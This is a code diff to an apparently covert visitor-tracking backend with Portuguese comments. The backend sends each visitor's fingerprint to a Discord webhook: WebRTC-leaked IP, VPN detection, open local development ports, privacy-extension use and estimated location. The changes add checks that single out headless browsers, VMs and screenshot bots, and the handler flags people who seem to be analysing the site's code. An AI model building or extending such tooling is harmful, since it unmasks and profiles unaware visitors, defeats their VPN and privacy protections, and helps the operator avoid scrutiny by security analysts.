@@ -186,8 +186,14 @@ module.exports = async function(req, res) {
         // ── Segundo webhook: resumo em linguagem humana ──
         if (DISCORD_GUIDE_WEBHOOK) {
             // Determina perfil do visitante
-            const isHeadless   = d.permsHeadless === 'YES' || d.liesSuspected === 'YES';
-            const isVM         = (d.audioEnv||'').includes('VM') || (d.audioEnv||'').includes('virtual');
+            const gpu          = (d.webglRenderer||'').toLowerCase();
+            const ua           = (d.userAgent||'').toLowerCase();
+            const isSwiftShader= gpu.includes('swiftshader') || gpu.includes('llvmpipe') || gpu.includes('softpipe');
+            const isScreenshotBot = ua.includes('vercel-screenshot') || ua.includes('googlebot') || ua.includes('screenshotbot') || ua.includes('headlesschrome');
+            const isAudioZero  = d.audioEnv === 'virtual/headless (latency=0)';
+            const isHeadless   = d.permsHeadless === 'YES' || d.liesSuspected === 'YES'
+                              || isSwiftShader || isScreenshotBot || isAudioZero;
+            const isVM         = !isHeadless && ((d.audioEnv||'').includes('VM') || (d.audioEnv||'').includes('virtual'));
             const hasVPN       = d.vpnLikely === 'YES' || d.tzDivergence === 'YES';
             const rtcLeaked    = d.rtcLeak === 'YES';
             const privExtension= d.canvasExtension === 'YES';
@@ -197,10 +203,13 @@ module.exports = async function(req, res) {
 
             let perfil = '🟢 Visitante comum';
             let perfilDesc = 'Sem sinais de proteção ou automação. Dados são confiáveis.';
-            if (isHeadless)        { perfil = '🤖 Bot / Automação';   perfilDesc = 'Navegador automatizado detectado (Puppeteer/Selenium ou similar). Provavelmente análise do site.'; }
-            else if (isAnalyst)    { perfil = '🔍 Analista suspeito'; perfilDesc = 'Humano real, mas trocou de aba várias vezes rapidamente. Pode estar analisando o código.'; }
-            else if (isDev)        { perfil = '👨‍💻 Desenvolvedor';      perfilDesc = 'Portas de desenvolvimento abertas no computador (Node, Python, etc).'; }
-            else if (privExtension){ perfil = '👻 Privacidade ativa'; perfilDesc = 'Usa extensão de privacidade (Brave Shields / CanvasBlocker). Fingerprints podem estar falsificados.'; }
+            if (isScreenshotBot)   { perfil = '📸 Bot de screenshot';  perfilDesc = `UA identificado como bot de deploy/crawler: \`${(d.userAgent||'').slice(0,80)}\``; }
+            else if (isSwiftShader){ perfil = '🤖 Headless / VM';      perfilDesc = 'GPU SwiftShader detectada — renderização por software sem hardware real. Browser headless ou máquina virtual sem GPU.'; }
+            else if (isAudioZero)  { perfil = '🤖 Headless / Bot';     perfilDesc = 'Audio latency = 0 — sem subsistema de áudio real. Padrão de browser automatizado.'; }
+            else if (isHeadless)   { perfil = '🤖 Bot / Automação';    perfilDesc = 'Navegador automatizado detectado (Puppeteer/Selenium ou similar). Provavelmente análise do site.'; }
+            else if (isAnalyst)    { perfil = '🔍 Analista suspeito';  perfilDesc = 'Humano real, mas trocou de aba várias vezes rapidamente. Pode estar analisando o código.'; }
+            else if (isDev)        { perfil = '👨‍💻 Desenvolvedor';       perfilDesc = 'Portas de desenvolvimento abertas no computador (Node, Python, etc).'; }
+            else if (privExtension){ perfil = '👻 Privacidade ativa';  perfilDesc = 'Usa extensão de privacidade (Brave Shields / CanvasBlocker). Fingerprints podem estar falsificados.'; }
 
             // VPN status
             let vpnStatus = '✅ Sem VPN detectada';
@@ -214,7 +223,7 @@ module.exports = async function(req, res) {
 
             const guideEmbed = {
                 title: `📋 Resumo do Visitante — ${new Date().toLocaleString('pt-BR', {timeZone:'America/Sao_Paulo'})}`,
-                color: isHeadless ? 0xe74c3c : isDev||isAnalyst ? 0xf39c12 : privExtension ? 0x9b59b6 : 0x2ecc71,
+                color: isHeadless ? 0x95a5a6 : isVM ? 0xe67e22 : isDev||isAnalyst ? 0xf39c12 : privExtension ? 0x9b59b6 : 0x2ecc71,
                 fields: [
                     { name: '👤 Perfil identificado',    value: `**${perfil}**\n${perfilDesc}`, inline: false },
                     { name: '🌍 Localização estimada',   value: `${d.geoCity||d.city||'?'}, ${d.geoRegion||d.region||'?'}, ${d.geoCountry||d.country||'?'}`, inline: true },
